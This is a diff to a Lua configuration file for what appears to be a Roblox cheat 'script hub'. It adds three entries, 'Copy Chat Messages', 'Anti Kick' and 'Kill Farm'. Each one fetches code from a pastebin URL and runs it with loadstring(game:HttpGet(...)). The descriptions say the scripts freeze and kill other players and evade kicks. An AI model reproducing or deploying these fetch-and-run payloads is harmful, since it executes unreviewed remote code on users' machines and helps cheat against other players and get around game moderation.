@@ -75,19 +75,44 @@ _G.Table = {
 
 	GuiScripts = {
 		["Scripts"] = {
-			["NameScriptName"] = {
+			["Copy Chat Messages"] = {
 				Owner = "V31nc",
-				Description = "Hello World",
+				Description = "Copies chat messages. You can't stop it.",
+				GameId = 0,
+				RigType = "Any", -- R6, R15, Any
+				IsOP = false,
+				IsNew = false,
+				ScriptId = 1001,
+				Script = function()
+					loadstring(game:HttpGet(('https://pastebin.com/raw/NWMaSHhe'),true))()
+				end,
+			},
+
+			["Anti Kick"] = {
+				Owner = "Unknown",
+				Description = "This script only works on some games.",
 				GameId = 0,
 				RigType = "Any", -- R6, R15, Any
 				IsOP = true,
-				IsNew = true,
-				ScriptId = 0000,
-				Favorited = false,
+				IsNew = false,
+				ScriptId = 1002,
 				Script = function()
-					print("hello from script section")
+					loadstring(game:HttpGet(('https://pastebin.com/raw/Yi2QRzTu'),true))()
 				end,
-			}
+			},
+
+			["Kill Farm"] = {
+				Owner = "Zaptosis (Unverified Creator)",
+				Description = "Freeze players to kill them. Only works on some games.",
+				GameId = 0,
+				RigType = "Any", -- R6, R15, Any
+				IsOP = true,
+				IsNew = false,
+				ScriptId = 1003,
+				Script = function()
+					loadstring(game:HttpGet(('https://pastebin.com/raw/a0jjaAyd'),true))()
+				end,
+			},
 		},
 
 		["Required Accessories"] = {
